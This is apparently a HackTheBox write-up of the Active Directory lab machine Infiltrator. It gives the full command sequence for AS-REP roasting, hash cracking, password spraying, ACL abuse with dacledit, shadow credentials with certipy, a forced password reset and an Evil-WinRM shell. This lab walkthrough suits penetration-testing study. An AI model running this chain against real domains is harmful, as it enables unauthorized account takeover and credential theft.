# Infiltrator

**By Stager** | FashilHack

---

## What is this machine

Infiltrator is a hard Windows Active Directory box on HackTheBox. It's a step up from Forest — no anonymous hash grabs this time. You start from a static website, build a username list from employee names, validate them with kerbrute, crack a hash, then follow a multi-step BloodHound attack chain involving ACL abuse, shadow credentials, and certificate services to work your way from a low-privilege user all the way to a shell.

Every step requires a different tool and a different technique. This one teaches you how real AD attacks chain together when nothing is handed to you.

---

## Target

```
IP:     10.10.10.1
Domain: infiltrator.htb
DC:     dc01.infiltrator.htb
```

Added everything to `/etc/hosts`:
```
10.10.10.1 dc01.infiltrator.htb infiltrator.htb dc01
```

---

## Step 1 — Nmap Scan

```bash
nmap -sC -sV -oA nmap/infiltrator -vv 10.10.10.1
```

Standard AD ports confirmed — DNS, Kerberos, LDAP, SMB, WinRM. Domain Controller.

![Nmap Results](./images/nmap.png)

---

## Step 2 — Website Recon → Username List

The web server had a static site with an employee section. Employee names were sitting in `h4` tags on the page. Instead of copying manually used curl and grep to pull them:

```bash
curl -s -q 10.10.10.1 | grep -oP 'h4>.[0-9]* \K(.*?)(?=h)'
```

Saved the names to `potential_users.txt`. Then generated possible username formats using username-anarchy — this tool takes real names and outputs every common username format (firstname.lastname, flastname, f.lastname etc):

```bash
username-anarchy -i potential_users.txt
```

Saved the output to `users.txt`.

![Username List Generated](./images/usernames.png)

---

## Step 3 — Kerbrute User Validation + AS-REP Roasting

Kerbrute does two things at once — it validates which usernames actually exist in the domain AND checks if any of them have pre-authentication disabled (which means you get a hash for free):

```bash
kerbrute userenum --dc 10.10.10.1 -d infiltrator.htb potential_users.txt
```

Got some valid users back. One of them returned a hash. The hash started with `$krb5asrep$23` — mode 18200 in hashcat and crackable.

If the hash comes back as `$18` (AES) hashcat can't crack it. Downgrade it to RC4 first:

```bash
kerbrute userenum --dc 10.10.10.1 -d infiltrator.htb --downgrade potential_users.txt
```

Now the hash is format 23 and crackable.

![Kerbrute Output](./images/kerbrute.png)

---

## Step 4 — Hashcat

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked. Got plaintext password for `l.clark`.

![Hash Cracked](./images/hashcat.png)

---

## Step 5 — User Enumeration with NetExec

With valid credentials pulled all domain users:

```bash
nxc smb 10.10.10.1 -u l.clark -p 'whatismypass!' --users
```

Sometimes needs the hostname instead of IP:

```bash
nxc smb dc01.infiltrator.htb -u l.clark -p 'whatismypass!' --users
```

Found a password hint for `k.turner` in the user description fields. Noted it.

![User Enumeration](./images/nxc-users.png)

---

## Step 6 — Password Spraying

Took all discovered passwords and sprayed them across all users. Used Kerberos authentication this time because some accounts had NTLM disabled:

```bash
nxc smb 10.10.10.1 -k -u users.txt -p passwords.txt --continue-on-success
```

Got a hit — `l.clark`'s password worked on `d.anderson` too. Password reuse across accounts.

Confirmed login for d.anderson with Kerberos:

```bash
nxc smb 10.10.10.1 -k -u d.anderson -p 'whatismypass!' --continue-on-success
```

Note: trying d.anderson with NTLM (`-u d.anderson -p password` without `-k`) returned "account restriction" — NTLM was disabled for this account. Kerberos only.

Marked both `l.clark` and `d.anderson` as owned in BloodHound.

![Password Spray Hit](./images/spray.png)

---

## Step 7 — BloodHound Collection with RustHound-CE

Used rusthound-ce instead of SharpHound because this domain had certificate services — rusthound captures all the cert template info too:

```bash
rusthound-ce -d infiltrator.htb -u l.clark -p 'whatismypass!'
```

Generated JSON files with all AD relationship data.

Started BloodHound:

```bash
cd /opt/bloodhound/server
docker compose up -d
```

Browsed to `localhost:8088`, logged in, uploaded the rusthound data.

![BloodHound Loaded](./images/bloodhound.png)

---

## Step 8 — BloodHound Attack Path Analysis

Marked l.clark and d.anderson as owned. Ran two key queries:

**Query 1:** Shortest path to systems for unconstrained delegation
- Found `infiltrator-srv` account can perform **ADCS ESC4** over the domain — potential privesc path noted for later

**Query 2:** Shortest path from owned objects
- Added d.anderson as owned and reran

BloodHound showed the full attack chain in orange and green edges:

```
d.anderson → GenericAll on MarketingDigital OU
    → OU contains e.rodriguez
        → e.rodriguez can add himself to Chief-Marketing group
            → Chief-Marketing has ForceChangePassword on m.harris
```

The plan:
1. d.anderson takes control of MarketingDigital OU
2. Create shadow credentials for e.rodriguez
3. Add e.rodriguez to the marketing group
4. Force change m.harris password
5. Get shell as m.harris via WinRM

![BloodHound Attack Path](./images/bloodhound-path.png)

---

## Step 9 — ACL Abuse with dacledit.py

d.anderson had GenericAll on the MarketingDigital OU. Used dacledit to grant full control over the OU with inheritance so it applies to all child objects (including e.rodriguez inside it):

```bash
dacledit.py -action write -rights FullControl -inheritance \
  -principal d.anderson \
  -target-dn "OU=MarketingDigital,DC=infiltrator,DC=htb" \
  -k -dc-ip 10.10.10.1 \
  'infiltrator.htb/d.anderson:whatismypass!'
```

d.anderson now had full control over everything inside that OU.

![dacledit Success](./images/dacledit.png)

---

## Step 10 — Shadow Credentials for e.rodriguez via Certipy

Shadow credentials is an AD CS attack — it uses certificate services to create an alternative credential for an account without changing their password. The result is an NTLM hash you can use to authenticate as that user.

```bash
certipy shadow auto -k \
  -target dc01.infiltrator.htb \
  -u d.anderson@infiltrator.htb \
  -p 'whatismypass!' \
  -account e.rodriguez
```

Got the NTLM hash for e.rodriguez. Copied it.

![Shadow Creds](./images/shadow-creds.png)

---

## Step 11 — Add e.rodriguez to Marketing Group via bloodyAD

Used bloodyAD to add e.rodriguez to the Chief-Marketing group using the hash:

```bash
bloodyAD -u e.rodriguez -p ':<hash>' \
  --host dc01.infiltrator.htb \
  -d infiltrator.htb \
  add groupMember "Chief Marketing" e.rodriguez
```

e.rodriguez was now in the group that had ForceChangePassword on m.harris.

---

## Step 12 — Force Change m.harris Password

```bash
bloodyAD -u e.rodriguez -p ':<hash>' \
  --host dc01.infiltrator.htb \
  -d infiltrator.htb \
  set password m.harris 'NewPassword123!'
```

m.harris password changed.

---

## Step 13 — Get Kerberos Ticket for m.harris

```bash
getTGT.py 'infiltrator.htb/m.harris:NewPassword123!'
```

Got `m.harris.ccache` — a Kerberos ticket file.

Marked m.harris as owned in BloodHound. BloodHound showed m.harris was a member of Remote Management — meaning WinRM access.

---

## Step 14 — Configure Kerberos and Evil-WinRM

Set up the Kerberos config file on Kali so Evil-WinRM could use the ticket:

```bash
nxc smb infiltrator.htb --generate-krb5-file infiltrator-krb.conf
sudo cp infiltrator-krb.conf /etc/krb5.conf
```

Logged in using the ticket:

```bash
KRB5CCNAME=m.harris.ccache evil-winrm -i dc01.infiltrator.htb -r infiltrator.htb
```

Shell obtained as m.harris.

```bash
whoami /all
```

Checked all privileges and group memberships.

![Evil-WinRM Shell](./images/shell.png)

---

## The Full Chain

```
Static website → employee names scraped
  ↓
username-anarchy → username formats generated
  ↓
kerbrute → valid users confirmed + AS-REP hash (l.clark)
  ↓
hashcat → l.clark password cracked
  ↓
NetExec → all domain users enumerated
  ↓
Password spray with Kerberos → d.anderson owned (same password)
  ↓
rusthound-ce → BloodHound data collected
  ↓
BloodHound → attack chain found:
  d.anderson → GenericAll on OU → e.rodriguez → ForceChangePassword → m.harris
  ↓
dacledit.py → full control of MarketingDigital OU
  ↓
certipy shadow → NTLM hash for e.rodriguez
  ↓
bloodyAD → e.rodriguez added to Chief-Marketing group
  ↓
bloodyAD → m.harris password changed
  ↓
getTGT.py → Kerberos ticket for m.harris
  ↓
Evil-WinRM with ticket → shell as m.harris
```

---

## What I learned from this one

**Employee names on websites are recon gold.** The attack started with names on a static site. Always scrape employee sections — those names become usernames.

**username-anarchy saves time.** Real usernames follow patterns — firstname.lastname, flastname, f.lastname. The tool generates all of them so you don't guess.

**Kerbrute validates AND roasts in one shot.** It tells you which users exist and dumps hashes for pre-auth disabled accounts at the same time.

**AES hashes ($18) can't be cracked — downgrade to RC4.** The `--downgrade` flag in kerbrute forces the DC to respond with a weaker RC4 hash that hashcat can crack. This is a real-world technique.

**NTLM can be disabled per account.** Some accounts only allow Kerberos. If you get account restriction errors try adding `-k` to your nxc command.

**rusthound-ce over SharpHound when AD CS is present.** It captures certificate template information that SharpHound misses — critical for finding ESC attack paths.

**Shadow credentials don't change the victim's password.** That's why they're stealthy. You get a hash to authenticate as the user without them noticing anything changed.

**BloodHound path colors matter.** Orange and green edges = exploitable paths. Yellow and yellow = nothing actionable there. Always follow the orange.

**getTGT + KRB5CCNAME is the Kerberos-only login flow.** When NTLM is disabled you need a ticket. Generate it with getTGT, export it as an environment variable, then tools like Evil-WinRM pick it up automatically.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._